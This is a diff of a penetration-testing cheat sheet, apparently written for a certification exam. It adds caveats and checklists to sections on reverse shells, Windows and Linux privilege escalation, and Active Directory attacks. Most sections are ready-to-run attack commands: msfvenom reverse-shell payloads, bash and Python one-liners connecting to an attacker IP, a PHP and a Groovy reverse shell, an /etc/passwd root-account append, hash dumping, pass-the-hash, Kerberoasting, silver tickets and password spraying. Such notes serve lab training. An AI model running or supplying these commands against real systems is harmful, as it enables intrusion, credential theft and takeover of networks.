-### Msfvenom
+#### Msfvenom
 
-```powershell
+Run these generators in Kali Bash. Match OS, architecture, staged versus single payload and handler. A staged `windows/shell/reverse_tcp` needs a compatible staging handler; a plain Netcat listener does not supply the stage. The underscore form `shell_reverse_tcp` is a single payload. See [payload types](https://docs.rapid7.com/metasploit/working-with-payloads/) and the [exam limitations](docs/exam.md).
+
+```text
 msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
 
@@ -1236,25 +1390,24 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.wa
 msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 ```
 
-### One Liners
+#### One Liners
 
-```powershell
+```text
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 <?php echo shell_exec('bash -i >& /dev/tcp/10.11.0.106/443 0>&1');?>
 #PowerShell -EncodedCommand expects Base64-encoded UTF-16LE text; Base64 is encoding, not encryption.
 ```
 
-<aside>
-💡 While dealing with PHP reverseshell use: [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)
 
-</aside>
+**Exam Tip:** While dealing with PHP reverseshell use: [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)
 
-### Groovy reverse-shell
+
+#### Groovy reverse-shell
 
 - For Jenkins
 
-```powershell
+```text
 String host="localhost";
 int port=8044;
 String cmd="cmd.exe";
@@ -1263,17 +1416,26 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 ---
 
-# Windows Privilege Escalation
+## Windows Privilege Escalation
+
+**Checklist**
+
+- [ ] Identity, enabled privileges and local/domain groups recorded?
+- [ ] Service/task identity, writable component and trigger all verified?
+- [ ] Saved credentials, relevant history and application configurations checked?
+- [ ] Resulting privileged shell and required evidence captured?
 
 Use the [exam evidence checklist](docs/exam.md#evidence-at-each-milestone) for proof requirements; a recursive text search is not proof of privileged access.
 
-## Manual Enumeration commands
+### Manual Enumeration commands
 
-```bash
+Target PowerShell:
+
+```powershell
 #Groups we're part of
 whoami /groups
 
-whoami /all #lists everything we own.
+whoami /all # current token identity, groups and privileges
 
 #Starting, Restarting and Stopping services in Powershell
 Start-Service <service>
@@ -1301,9 +1463,11 @@ Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.doc
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 ```
 
-## Automated Scripts
+### Automated Scripts
 
-```bash
+Use these to fill gaps after manual triage. Check upstream invocation and the local filename; PowerShell scripts must be loaded or invoked according to their documentation. A filename list is an inventory, not one executable script.
+
+```text
 winpeas.exe
 winpeas.bat
 Jaws-enum.ps1
@@ -1311,7 +1475,7 @@ powerup.ps1
 PrivescCheck.ps1
 ```
 
-## Token Impersonation
+### Token Impersonation
 
 Check OS build, architecture, enabled privileges and the required service/trigger. A privilege name alone does not establish exploitability. [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) is archived; use each project's documented target support. [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG).
 - Command to check `whoami /priv`
@@ -1336,19 +1500,19 @@ SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe 
 #writes whoami command to w.log file
 ```
 
-## Services
+### Services
 
-### Binary Hijacking
+#### Binary Hijacking
 
 ```powershell
 #Identify service from winpeas
-icacls "path" #F means full permission, we need to check we have full access on folder
+icacls "path" # inspect effective file/directory rights; F means full control, but narrower write/modify rights may suffice
 sc.exe qc <servicename> #find binarypath variable
 sc.exe config <service> binPath= "<FULL_BINARY_PATH>" # requires SERVICE_CHANGE_CONFIG; space after = is required
 sc.exe start <servicename>
 ```
 
-### Unquoted Service Path
+#### Unquoted Service Path
 
 ```powershell
 Get-CimInstance Win32_Service | Select-Object Name,StartName,PathName
@@ -1359,7 +1523,7 @@ icacls "path"
 sc.exe start <servicename>
 ```
 
-### Insecure Service Executables
+#### Insecure Service Executables
 
 ```bash
 #In Winpeas look for a service which has the following
@@ -1368,7 +1532,7 @@ File Permissions: Everyone [AllAccess]
 sc.exe start <service>
 ```
 
-### Weak Registry permissions
+#### Weak Registry permissions
 
 ```bash
 #Look for the following in Winpeas services info output
@@ -1385,7 +1549,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND
 net start <service>
 ```
 
-## DLL Hijacking
+### DLL Hijacking
 
 1. Find Missing DLLs using Process Monitor, Identify a specific service which looks suspicious and add a filter.
 2. Check whether you have write permissions in the directory associated with the service.
@@ -1396,7 +1560,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attaker-IP> LPORT=<listening-po
 3. Copy it to victom machine and them move it to the service associated directory.(Make sure the dll name is similar to missing name)
 4. Start listener and restart service, you'll get a shell.
 
-### DLL Hijacking adding New user into Administrators group
+#### DLL Hijacking adding New user into Administrators group
 1. Create DLL with name file.cpp
 2. Convert file to .cpp to .dll, executable DLL using "x86_64-w64-mingw32-gcc".
 3. Place DLL on the target, with same name as missing (My case - BetaService)
@@ -1435,7 +1599,7 @@ x86_64-w64-mingw32-gcc file.cpp --shared -o file.dll
 ```
 
 
-## Autorun
+### Autorun
 
 ```powershell
 #For checking, it will display some information with file-location
@@ -1448,9 +1612,9 @@ accesschk.exe -accepteula -wvu "<path>" #returns FILE_ALL_ACCESS
 #Replace the executable with the reverseshell and we need to wait till Admin logins, then we'll have shell
 ```
 
-## AlwaysInstallElevated
+### AlwaysInstallElevated
 
-```powershell
+```text
 #For checking, it should return 1 or Ox1
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -1462,7 +1626,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> --platform win
 msiexec /quiet /qn /i reverse.msi
 ```
 
-## Scheduled Tasks
+### Scheduled Tasks
 
 ```bash
 schtasks /query /fo LIST /v #Displays list of scheduled tasks, Pickup any interesting one
@@ -1471,7 +1635,7 @@ icacls "path"
 #Wait till the scheduled task in executed, then we'll get a shell
 ```
 
-## Startup Apps
+### Startup Apps
 
 ```bash
 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp #Startup applications can be found here
@@ -1479,7 +1643,7 @@ C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp #Startup applicatio
 #Startup-folder programs normally run at user sign-in, with that user's context; restart alone does not imply elevation.
 ```
 
-## Insecure GUI apps
+### Insecure GUI apps
 
 ```bash
 #Check the applications that are running from "TaskManager" and obtain list of applications that are running as Privileged user
@@ -1487,7 +1651,7 @@ C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp #Startup applicatio
 file://c:/windows/system32/cmd.exe 
 ```
 
-## SAM and SYSTEM
+### SAM and SYSTEM
 
 - Check in following folders
 
@@ -1515,25 +1679,27 @@ impacket-secretsdump -system SYSTEM -sam SAM local
 #Now a detailed list of hashes are displayed
 ```
 
-## Passwords
+### Passwords
 
-### Sensitive files
+#### Sensitive files
 
-```bash
+Target CMD; start from a relevant application or user directory:
+
+```cmd
 findstr /si password *.txt  
 findstr /si password *.xml  
 findstr /si password *.ini  
 Findstr /si password *.config 
-findstr /si pass/pwd *.ini  
+findstr /si /c:"pass" /c:"pwd" *.ini
 
-dir /s *pass* == *cred* == *vnc* == *.config*  
+dir /s /b *pass* *cred* *vnc* *.config*
 
-in all files  
+# Search text files recursively
 findstr /spin "password" *.*  
 findstr /spin "password" *.*
 ```
 
-### Config files
+#### Config files
 
 ```bash
 c:\sysprep.inf  
@@ -1553,9 +1719,11 @@ dir c:\*ultravnc.ini /s /b
 dir c:\ /s /b | findstr /si *vnc.ini
 ```
 
-### Registry
+#### Registry
 
-```bash
+Target CMD (the commented labels below group queries):
+
+```text
 reg query HKLM /f password /t REG_SZ /s
 reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
 
@@ -1572,7 +1740,7 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"  
 
 ### SNMP Parameters
-reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"  
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP"
 
 ### Putty  
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"  
@@ -1582,7 +1750,7 @@ reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 ```
 
-### RunAs - Savedcreds
+#### RunAs - Savedcreds
 
 ```bash
 cmdkey /list #Displays stored credentials, looks for any optential users
@@ -1590,7 +1758,7 @@ cmdkey /list #Displays stored credentials, looks for any optential users
 runas /savecred /user:admin C:\Temp\reverse.exe
 ```
 
-### Pass the Hash
+#### Pass the Hash
 
 ```bash
 #If hashes are obtained though some means then use psexec, smbexec and obtain the shell as different user.
@@ -1599,20 +1767,28 @@ pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX2
 
 ---
 
-# Linux Privilege Escalation
+## Linux Privilege Escalation
+
+**Checklist**
+
+- [ ] Identity, groups and exact sudo rules checked?
+- [ ] SUID owner, capabilities and mount restrictions verified?
+- [ ] Writable scheduled components, service configs and local listeners checked?
+- [ ] Reused passwords and relevant history/configuration secrets tested?
+- [ ] Root shell and required evidence captured?
 
 - [Privesc through TAR wildcard](https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa)
 
-## TTY Shell
+### TTY Shell
 
-```powershell
+```text
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 /bin/sh -i
 /bin/bash -i
 perl -e 'exec "/bin/sh";'
 ```
 
-## Basic
+### Basic
 
 ```bash
 find / -writable -type d 2>/dev/null
@@ -1625,41 +1801,47 @@ watch -n 1 "ps aux | grep pass" #Checking processes for credentials
 sudo tcpdump -i lo -A | grep "pass" #Password sniffing using tcpdump
 
 ```
-## Manual Enumeration
+### Manual Enumeration
 
 - id
 - `cat /etc/passwd` - displays all the user
     - `cat /etc/passwd | cut -d ":" -f 1` - removes other stuff & only displays users
     - `ls /home` - displays users
 - `hostname` - lists the name of the host
-- `cat /etc/issue` - exact version on the OS
-cat /etc/os-release
+- `cat /etc/issue` - login banner; verify distribution details with `/etc/os-release`
+- `cat /etc/os-release` - distribution identification
 - `uname -a` - prints kernel information
+```bash
 cd /home
-groups <USER> 
+groups <USER>
 id -G <USER>
+```
 
 - `ps` - lists the processes that are running
     - `ps -A` - all running processes
     - `ps axjf` - process tree
     - `ps aux` - displays processes with the users as well
-ip a or ifconfig
-routel or route
-ss -anp or netstat -anp
+Additional Linux checks (run alternatives individually; some require privileges or installed legacy utilities):
+
+```bash
+ip addr                        # legacy alternative: ifconfig
+ip route                       # alternatives: routel, route
+ss -anp                        # legacy alternative: netstat -anp
 cat /etc/iptables/rules.v4
 ls -lah /etc/cron*
 crontab -l
 sudo crontab -l
-dpkg -l or rpm
+dpkg -l                        # RPM systems: rpm -qa
 find / -writable -type d 2>/dev/null
-cat /etc/fstab 
+cat /etc/fstab
 mount
 lsblk
 lsmod
-/sbin/modinfo libata #libata found in the output of lsmod
+/sbin/modinfo libata            # inspect a module actually observed in lsmod
 find / -perm -u=s -type f 2>/dev/null
-strings file_read(Read file)
+strings <FILE_TO_INSPECT>
 which bash sh awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp git 2>/dev/null
+```
 
 - `cat /proc/version` - prints almost same infor of above command but more like gcc version....
 
@@ -1671,7 +1853,7 @@ which bash sh awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp f
 - `history` - previously ran commands which might have some sensitive info
 - `ifconfig` (or) `ip a` (or) `ip route` - network related information
   
-- **netstat** - network route
+- **netstat** - network connection/interface statistics; use `netstat -r` for routes
     - `netstat -a` - all listening and established connection
     - `netstat -at` - tcp connections
     - `netstat -au` - udp connections
@@ -1697,11 +1879,13 @@ which bash sh awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp f
     - `find / -writable -type d 2>/dev/null` : find directories writable by the current user
     - `find / -perm -0002 -type d 2>/dev/null` : find world-writable directories
     - `find / -perm -0001 -type d 2>/dev/null` : find world-executable directories
-    - We can also find programming languages and supported languages: `find / -name perl*`, `find / -name python*`, `find / -name gcc*` ...etc
-    - `find / -perm -u=s -type f 2>/dev/null` : Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. This is important!
+    - We can also find programming languages and supported languages: `find / -name 'perl*'`, `find / -name 'python*'`, `find / -name 'gcc*'` ...etc
+    - `find / -perm -u=s -type f 2>/dev/null` : Find SUID files; owner, mount policy and program behavior determine the effective context. The owner need not be root.
 
 
-## Automated Scripts
+### Automated Scripts
+
+Use an enumeration script after manual triage leaves a specific gap; confirm the relevant permissions and configuration yourself. An exploit suggester reports candidates, not demonstrated vulnerabilities.
 
 - LinPeas: [https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
 - LinEnum: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
@@ -1709,7 +1893,7 @@ which bash sh awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp f
 - Linux Smart Enumeration: [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
 - Linux Priv Checker: [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)
 
-## Sensitive Information
+### Sensitive Information
 
 ```bash
 cat .bashrc
@@ -1718,19 +1902,19 @@ watch -n 1 "ps aux | grep pass" #Harvesting active processes for credentials
 #Process related information can also be obtained from PSPY
 ```
 
-## Sudo/SUID/Capabilities
+### Sudo/SUID/Capabilities
 
-### Sudo:
+#### Sudo:
 
 [](https://github.com/saisathvik1/Linux-Privilege-Escalation-Notes#sudo)
 
-- This one of the first step to do, when you get access to the machine just simpley run "sudo -l", which lists all the files that we can run as root without any password
+- Run `sudo -l` early. Read the run-as identity, exact arguments and tags; only `NOPASSWD` entries waive the authentication requirement. A rule may permit a user other than root.
 - Once you have any to run then navigate to [https://gtfobins.github.io/](https://gtfobins.github.io/) and search for is the one specified is a system program or else modify the file with "/bin/sh" and run that
 - GTFO bins is going to be saviour!
 
 ---
 
-### SUID:(Set owner User ID)
+#### SUID:(Set owner User ID)
 
 [](https://github.com/saisathvik1/Linux-Privilege-Escalation-Notes#suidset-owner-user-id)
 
@@ -1742,26 +1926,26 @@ watch -n 1 "ps aux | grep pass" #Harvesting active processes for credentials
 
 ---
 
-### Capabilities:
+#### Capabilities:
 
 [](https://github.com/saisathvik1/Linux-Privilege-Escalation-Notes#capabilities)
 
 - Capabilities are a bit similar to the SUID
 - Capabilities provide a subset of root privileges to a process or a binary
 - In order to look for them use `getcap -r / 2>/dev/null`
-- Find the binary and check that on **GTFOBins** where there's a function for **Capabilities** and try out those any of them will work!
+- Match the binary, capability and runtime features to the relevant **GTFOBins** entry. A listed capability does not guarantee an escalation path.
 - In the example they provided a capability for `vim` and I used `./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'` which is provided in the website itself and I got root!
-- Remember that this process is hit or trail, if it doesnt work move on!
+- If a test fails, record which prerequisite is absent before changing approach.
 
 
-## Cron Jobs
+### Cron Jobs
 
 - Crons jobs are used for scheduling! Here we can schedule any binary/process to run.
 - Interesting part here is that by default they run with the owner privileges.
 - But if we find any cron-job which we can edit then we can do a lot!
-- Cron job config is stored as **crontabs**
+- Cron configuration is stored in system and user **crontabs**; the execution user and permissions depend on that configuration.
 - To view crontab, `cat /etc/crontab`
-- Any one can view it!
+- Read access depends on permissions; user crontabs and logs may be restricted.
 - Now we'll can see some cron-jobs see whether you can edit or not, if you can then edit with some reverse shell and listen!
 
 ```bash
@@ -1773,7 +1957,7 @@ pspy #handy tool to livemonitor stuff happening in Linux
 
 grep "CRON" /var/log/syslog #inspecting cron logs
 ```
-## NC Netcat
+### NC Netcat
 
 `-e` is implementation-specific and absent from OpenBSD netcat. Check `nc -h` before using historical examples; a listener alone does not execute a shell.
 
@@ -1781,7 +1965,7 @@ grep "CRON" /var/log/syslog #inspecting cron logs
 nc -nlvp <port> 
 nc <attacker-ip> <port> -e /bin/bash
 ```
-## NFS
+### NFS
 
 - Read `/etc/exports` and included `/etc/exports.d/*.exports` on the server if permitted. `showmount -e <target IP>` lists exports where the mount service is available; it does not reveal all export options and can miss NFSv4-only configurations.
 - Verify `no_root_squash` in the server configuration or effective behavior. The export must also be writable, and the target execution mount must honor SUID (not `nosuid`). Client root privileges alone do not bypass root squashing.
@@ -1802,7 +1986,7 @@ mount -o rw <targetIP>:<share-location> <directory path we created>
 chmod +x <binary>
 ```
 
-## PATH
+### PATH
 
 [](https://github.com/saisathvik1/Linux-Privilege-Escalation-Notes#path)
 
@@ -1817,16 +2001,20 @@ chmod +x <binary>
 
 ---
 
-## Writable /etc/passwd file
-```bash
+### Writable /etc/passwd file
+
+Historical lab transcript (`>` marks the prompt). The file must be writable, and the target authentication stack must accept the generated hash format. A duplicate UID 0 entry changes account state; record and restore the original file in your disposable lab.
+
+```text
 >ls -l /etc/passwd
 -rw-rw-rw- 1 root root 1370 Apr 12 16:44 /etc/passwd (#Write permission)
->openssl passwd ashok
-DLYJ9ZDE6uY5o
->echo "ashok:DLYJ9ZDE6uY5o:0:0:root:/root:/bin/bash" >> /etc/passwd
->su ashok(#password is also ashok, switch directory to ashok get the flag)
+>openssl passwd -6
+# Enter a lab password interactively; use the generated hash below.
+>echo 'ashok:<GENERATED_HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
+>su ashok
+# Historical lab transcript: replace <GENERATED_HASH>; verify id after authentication.
 ```
-## Exploiting Kernel Vulnerabilities
+### Exploiting Kernel Vulnerabilities
 
 Match the exact kernel package, architecture and configuration to the distribution advisory, including backported fixes. A banner match does not prove exploitability. Record these before selecting an external PoC:
 
@@ -1836,84 +2024,91 @@ uname -m
 cat /etc/os-release
 ```
 
-## CVE - Linux
+### CVE - Linux
 
 See [CVE references](docs/cve-references.md) for scoped Sudo, polkit and kernel advisories with external GitHub PoCs. Match each repository's supported target rather than assuming one script works on every affected version.
 
 ---
 
-# Post Exploitation
+## Post Exploitation
 
 > This is more windows specific as exam specific.
 > 
 
-<aside>
-💡 Run WinPEAS.exe - This may give us some more detailed information as no we’re a privileged user and we can open several files, gives some edge!
 
-</aside>
+> **Exam Tip:** After a privilege change, repeat targeted checks for previously unreadable configurations and history. Use winPEAS to fill an identified enumeration gap and verify its findings manually.
 
-## Sensitive Information
 
-### Powershell History
+### Sensitive Information
+
+#### Powershell History
+
+Target PowerShell (`$env:APPDATA` expands here; `%APPDATA%` is CMD syntax). PSReadLine may be absent in noninteractive sessions:
 
 ```powershell
-type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 
 #Example
 type C:\Users\sathvik\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 
 ```
 
-### Searching for passwords
+#### Searching for passwords
 
 ```powershell
-dir /s *pass* *.config
-findstr /si password *.xml *.ini *.txt
+Get-ChildItem -Path . -Recurse -File -Include *pass*,*.config -ErrorAction SilentlyContinue
+Get-ChildItem -Path . -Recurse -File -Include *.xml,*.ini,*.txt -ErrorAction SilentlyContinue | Select-String -Pattern password
 ```
 
-### Searching in Registry for Passwords
+#### Searching in Registry for Passwords
 
 ```powershell
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 ```
 
-<aside>
-💡 Always check documents folders, i may contain some juicy files
 
-</aside>
+> **Exam Tip:** Check relevant Documents folders for configurations, backups and credential stores; record the source and identity of each useful secret.
 
-### KDBX Files
 
-```powershell
+#### KDBX Files
+
+```text
 #These are KeyPassX password stored files
-cmd> dir /s /b *.kdbx 
-Ps> Get-ChildItem -Recurse -Filter *.kdbx
+# PowerShell
+Get-ChildItem -Recurse -File -Filter *.kdbx -ErrorAction SilentlyContinue
 
 #Cracking
 keepass2john Database.kdbx > keepasshash
 john --wordlist=/home/sathvik/Wordlists/rockyou.txt keepasshash
 ```
 
-## Dumping Hashes
+### Dumping Hashes
 
 Identify the credential source and effective read privileges first. Mimikatz access depends on protection and token context; BloodHound maps directory relationships and does not dump password hashes. See [AD credential handling](docs/active-directory.md#4-track-credentials-and-authentication-types).
 
 ---
 
-# Active Directory Pentesting
+## Active Directory Pentesting
 
-<aside>
-💡 We perform the following stuff once we’re in AD network
+**Checklist**
 
-</aside>
+- [ ] Domain/DC DNS and clock alignment verified?
+- [ ] Credential origin, type and local/domain scope recorded?
+- [ ] Group/ACL paths verified against current directory data?
+- [ ] New host access followed by local re-enumeration?
+- [ ] Lockout policy considered before repeated login tests?
 
-## Enumeration
+
+> **Exam Tip:** Establish the domain, current identity, DNS and routes before collecting directory data.
+
+
+### Enumeration
 
 ```bash
 net localgroup Administrators #to check local admins 
 ```
 
-### Powerview
+#### Powerview
 
 ```powershell
 Import-Module .\PowerView.ps1 #loading module to powershell, if it gives error then change execution policy
@@ -1938,7 +2133,7 @@ Get-DomainUser -PreauthNotRequired -verbose # identifying AS-REP roastable accou
 
 Get-NetUser -SPN | select serviceprincipalname #Kerberoastable accounts
 ```
-### Domain
+#### Domain
 
 PowerShell (CIM works without the deprecated WMIC executable):
 
@@ -1949,7 +2144,7 @@ Get-DnsClientServerAddress -AddressFamily IPv4
 
 Use the AD DNS domain and DC FQDN for Kerberos. A successful ping does not establish LDAP or Kerberos reachability.
 
-### Bloodhound
+#### Bloodhound
 
 Use BloodHound Community Edition and a compatible collector. The legacy Neo4j desktop setup is not the CE deployment process. Follow the [official deployment and collector guidance](https://bloodhound.specterops.io/collect-data/ce-collection/overview).
 
@@ -1967,7 +2162,7 @@ Windows, with a CE-compatible SharpHound release:
 
 Import the output into CE and check collection errors before interpreting paths. See [AD workflow](docs/active-directory.md) for permissions, DNS and credential scope. Legacy `bloodhound-python` output must match a legacy deployment.
 
-### LDAPDOMAINDUMP
+#### LDAPDOMAINDUMP
 
 - These files contains information in a well structured webpage format.
 
@@ -1975,7 +2170,7 @@ Import the output into CE and check collection errors before interpreting paths.
 sudo ldapdomaindump ldaps://<IP> -u 'username' -p 'password' #Do this in a new folder
 ```
 
-### PlumHound
+#### PlumHound
 
 These are legacy Neo4j workflows. Check the project's supported BloodHound generation before using them with CE.
 
@@ -1988,20 +2183,20 @@ python3 PlumHound.py -x tasks/default.tasks -p <neo4jpass> #Open index.html as o
 firefox index.html
 ```
 
-### PingCastle
+#### PingCastle
 
 - [www.pingcastle.com](http://www.pingcastle.com) - Download Zip file from here.
 - This needs to be run on windows machine, just hit enter and give the domain to scan.
 - It gives a report at end of scan.
 
-### PsLoggedon
+#### PsLoggedon
 
 ```powershell
 # To see user logons at remote system of a domain(external tool)
 .\PsLoggedon.exe \\<computername>
 ```
 
-### GPP or CPassword
+#### GPP or CPassword
 
 - Impacket
 
@@ -2041,46 +2236,45 @@ nxc smb <TARGET[s]> -u <USERNAME> -H <LMHASH>:<NTHASH> -d <DOMAIN> -M gpp_passwo
 gpp-decrypt "cpassword"
 ```
 
-## **Attacking Active Directory**
+### **Attacking Active Directory**
 
-<aside>
-💡 Make sure you obtain all the relevant credentials from compromised systems, we cannot survive if we don’t have proper creds.
 
-</aside>
+> **Exam Tip:** Track each credential’s source, account scope and verified access; revisit relevant services when a new secret is found.
 
-### Zerologon
+
+#### Zerologon
 
 Historical, patched CVE-2020-1472; not a generic credential-free hash dump. It requires a vulnerable DC and reachable Netlogon RPC. Exploit variants can change the DC machine-account password and disrupt the domain. Consult the [external reference](docs/cve-references.md) before considering it in a disposable lab.
 
-### Password Spraying
+#### Password Spraying
 
-```powershell
+```text
 # NetExec - administrative access is indicated by "Pwn3d!"
 nxc smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success #continue testing after a successful authentication
 
 # Kerbrute
 kerbrute passwordspray -d corp.com .\usernames.txt "pass"
 ```
-### DeadPotato SeImpersonatePrivilege
+#### DeadPotato SeImpersonatePrivilege
 
 The former machine-specific DeadPotato command had no pinned upstream build or reproducible prerequisites and has been removed. Start with [token impersonation](#token-impersonation): verify privileges, OS build, architecture and required services before selecting a tool. Creating a local administrator does not automatically grant domain access or RDP access.
 
-### AS-REP Roasting
+#### AS-REP Roasting
 
 Mode 18200 below applies to `$krb5asrep$23$`. AES AS-REP formats use different modes; identify the actual output before cracking.
 
-```powershell
+```text
 impacket-GetNPUsers -dc-ip <DC-IP> <domain>/<user>:<pass> -request #this gives us the hash of AS-REP Roastable accounts, from kali linux
 .\Rubeus.exe asreproast /nowrap #dumping from compromised windows host
 
 hashcat -m 18200 hashes.txt wordlist.txt # select this mode only for the matching hash type
 ```
 
-### Kerberoasting
+#### Kerberoasting
 
 Mode 13100 below applies to `$krb5tgs$23$`; AES etypes 17/18 use different modes. An SPN is an enumeration finding, not a promise of a crackable password.
 
-```powershell
+```text
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast #dumping from compromised windows host, and saving with customname
 
 impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request #from kali machine
@@ -2088,13 +2282,13 @@ impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request #from kali m
 hashcat -m 13100 hashes.txt wordlist.txt # select this mode only for the matching hash type
 ```
 
-### Silver Tickets
+#### Silver Tickets
 
 Historical recipe: possession of a service key does not guarantee current PAC validation will accept a forged ticket. Check SPN, encryption type and target/DC patches; see [chain compatibility](docs/command-audit.md#recheck-every-transition-in-a-chain).
 
 - Obtaining hash of an SPN user using **Mimikatz**
 
-```powershell
+```text
 privilege::debug
 sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
 ```
@@ -2102,51 +2296,51 @@ sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
 - Obtaining Domain SID
 
 ```powershell
-ps> whoami /user
+whoami /user
 # this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain   SID is "S-1-5-21-1987370270-658905905-1781884369"
 ```
 
 - Forging silver ticket Ft **Mimikatz**
 
-```powershell
+```text
 kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user>
 exit
 
 # we can check the tickets by,
-ps> klist
+klist
 ```
 
 - Accessing service
 
 ```powershell
-ps> iwr -UseDefaultCredentials <servicename>://<computername>
+iwr -UseDefaultCredentials <servicename>://<computername>
 ```
 
-### Secretsdump
+#### Secretsdump
 
-```powershell
+```text
 impacket-secretsdump <domain>/<user>:<password>@<IP>
 impacket-secretsdump -hashes <LMHASH>:<NTHASH> <user>@<IP> #local user (domain omitted)
 impacket-secretsdump -hashes <LMHASH>:<NTHASH> <domain>/<user>@<IP> #domain user
 ```
 
-### Dumping NTDS.dit
+#### Dumping NTDS.dit
 
 ```bash
 impacket-secretsdump -just-dc-ntlm <domain>/<user>:<password>@<IP>
 # Normally uses DRSUAPI replication (DCSync); requires directory replication rights. This is not a file copy of NTDS.dit.
 ```
 
-## Lateral Movement in Active Directory
+### Lateral Movement in Active Directory
 
-### psexec - smbexec - wmiexec - atexec
+#### psexec - smbexec - wmiexec - atexec
 
 - Here we can pass the credentials or even hash, depending on what we have
 
 > Impacket expects `LMHASH:NTHASH`; if the LM half is unavailable, use `:<NTHASH>`. NetExec and Evil-WinRM also accept a bare NT hash. These formats do not accept Net-NTLMv2 challenge-response strings.
 > 
 
-```powershell
+```text
 impacket-psexec <domain>/<user>:<password>@<IP>
 # Requires a writable SMB share AND permission to create/start a service; share write access alone is insufficient.
 
@@ -2168,7 +2362,7 @@ impacket-atexec -hashes <LMHASH>:<NTHASH> <domain>/<user>@<IP> <command>
 #we passed full hash here
 ```
 
-### winrs
+#### winrs
 
 ```powershell
 winrs -r:<computername> -u:<user> -p:<password> "command"
@@ -2176,7 +2370,7 @@ winrs -r:<computername> -u:<user> -p:<password> "command"
 # run this on windows session
 ```
 
-### NetExec
+#### NetExec
 
 - NetExec is the maintained successor to CrackMapExec. Refer to the [official wiki](https://www.netexec.wiki/) for current protocol and option support.
 
@@ -2216,26 +2410,29 @@ nxcdb #launch the database console
 help #list console commands
 proto smb #select the SMB protocol database
 ```
-### kpcli - KeePass password manager
-Found the Database.kdbx file in the smb enumeration
+#### kpcli - KeePass password manager
+
+Download a discovered database from the relevant share, then use a format-compatible converter/cracker. See [KeePass conversion](#keepass2john) for the John label and KDBX version caveats.
 ```
 smbclient -L //<TARGET>
-smb shell> smb: \DB-back (1)\New Folder\Emma\Documents\> get Database.kdbx
+# SMB console, after connecting to the share and changing to the directory:
+get Database.kdbx
